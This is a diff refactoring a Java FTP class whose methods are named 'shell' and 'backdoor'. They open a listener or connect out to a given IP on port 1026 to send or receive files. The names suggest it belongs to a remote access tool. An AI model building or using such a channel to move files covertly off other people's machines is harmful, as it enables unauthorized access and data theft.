@@ -20,88 +20,84 @@ public class FTP {
 	 * Transfers a file with client.
 	 * <p>
 	 * Opens {@link java.nio.channels.ServerSocketChannel}
-	 * {@link serverSocketChannel} and {@link java.nio.channels.SocketChannel}
-	 * {@link socketChannel} for transferring a file with client. If
-	 * {@link protocol} is "send", uses {@link #send} to send file with path
-	 * {@link filePath} to client. If {@link protocol} is "rec", uses {@link #rec}
-	 * to receive file with path {@link filePath} from client.
+	 * {@code serverSocketChannel} and {@link java.nio.channels.SocketChannel}
+	 * {@code socketChannel} for transferring a file with client. If
+	 * {@code protocol} is "send", uses {@link #send} to send file with path
+	 * {@code filePath} to client. If {@code protocol} is "rec", uses {@link #rec}
+	 * to receive file with path {@code filePath} from client.
 	 *
 	 * @param filePath path of file to transfer
 	 * @param protocol if file should be sent or received
 	 */
 	public static void shell(String filePath, String protocol) {
-		Thread thread = new Thread() {
-			public void run() {
-				ServerSocketChannel serverSocketChannel = null;
-				SocketChannel socketChannel = null;
+		Thread thread = new Thread(() -> {
+			ServerSocketChannel serverSocketChannel = null;
+			SocketChannel socketChannel = null;
+			try {
+				serverSocketChannel = ServerSocketChannel.open();
+				serverSocketChannel.socket().bind(new InetSocketAddress(1026));
+				socketChannel = serverSocketChannel.accept();
+				if (protocol.equals("send"))
+					send(filePath, socketChannel);
+				else if (protocol.equals("rec"))
+					rec(filePath, socketChannel);
+			} catch (Exception ignored) {
+			} finally {
 				try {
-					serverSocketChannel = ServerSocketChannel.open();
-					serverSocketChannel.socket().bind(new InetSocketAddress(1026));
-					socketChannel = serverSocketChannel.accept();
-					if (protocol.equals("send"))
-						send(filePath, socketChannel);
-					else if (protocol.equals("rec"))
-						rec(filePath, socketChannel);
-				} catch (Exception e) {
-				} finally {
-					try {
-						if (serverSocketChannel != null)
-							serverSocketChannel.close();
-						if (socketChannel != null)
-							socketChannel.close();
-					} catch (Exception e) {
-					}
+					if (serverSocketChannel != null)
+						serverSocketChannel.close();
+					if (socketChannel != null)
+						socketChannel.close();
+				} catch (Exception ignored) {
 				}
 			}
-		};
+		});
 		thread.start();
 	}
 
 	/**
 	 * Transfers a file with server.
 	 * <p>
-	 * Opens {@link java.nio.channels.SocketChannel} {@link socketChannel} for
-	 * transferring file with server with an IP address of {@link ip}. If
-	 * {@link protocol} is "send", uses {@link #send} to send file with path
-	 * {@link filePath} to server. If {@link protocol} is "rec", uses {@link #rec}
-	 * to receive file with path {@link filePath} from server.
+	 * Opens {@link java.nio.channels.SocketChannel} {@code socketChannel} for
+	 * transferring file with server with an IP address of {@code ip}. If
+	 * {@code protocol} is "send", uses {@link #send} to send file with path
+	 * {@code filePath} to server. If {@code protocol} is "rec", uses {@link #rec}
+	 * to receive file with path {@code filePath} from server.
 	 * 
 	 * @param filePath path of file to transfer
 	 * @param protocol if file should be sent or received
 	 * @param ip       IP address of server to transfer file with
 	 */
 	public static void backdoor(String filePath, String protocol, String ip) {
-		Thread thread = new Thread() {
-			public void run() {
-				SocketChannel socketChannel = null;
+		Thread thread = new Thread(() -> {
+			SocketChannel socketChannel = null;
+			try {
+				Thread.sleep(2000);
+				socketChannel = SocketChannel.open();
+				SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
+				socketChannel.connect(socketAddress);
+				if (protocol.equals("send"))
+					send(filePath, socketChannel);
+				else if (protocol.equals("rec"))
+					rec(filePath, socketChannel);
+				socketChannel.close();
+				socketTransferDone = true;
+			} catch (Exception e) {
+				error = e.getMessage();
+			} finally {
 				try {
-					Thread.sleep(2000);
-					socketChannel = SocketChannel.open();
-					SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
-					socketChannel.connect(socketAddress);
-					if (protocol.equals("send"))
-						send(filePath, socketChannel);
-					else if (protocol.equals("rec"))
-						rec(filePath, socketChannel);
-					socketChannel.close();
-					socketTransferDone = true;
-				} catch (Exception e) {
-					error = e.getMessage();
-				} finally {
-					try {
-						if (socketChannel != null)
-							socketChannel.close();
-					} catch (Exception e) {
-					}
+					if (socketChannel != null)
+						socketChannel.close();
+				} catch (Exception ignored) {
 				}
 			}
-		};
+		});
 		thread.start();
 	}
 
 	/**
-	 * Sends file with path {@link filePath} using {@link socketChannel} and
-	 * {@link fileChannel}.
+	 * Sends file with path {@code filePath} using {@code socketChannel} and
+	 * {@code fileChannel}.
 	 *
 	 * @param filePath      path of file to send
 	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
@@ -122,8 +118,8 @@ public class FTP {
 	}
 
 	/**
-	 * Receives file with path {@link filePath} using {@link socketChannel} and
-	 * {@link fileChannel}.
+	 * Receives file with path {@code filePath} using {@code socketChannel} and
+	 * {@code fileChannel}.
 	 *
 	 * @param filePath      path of file to receive
 	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
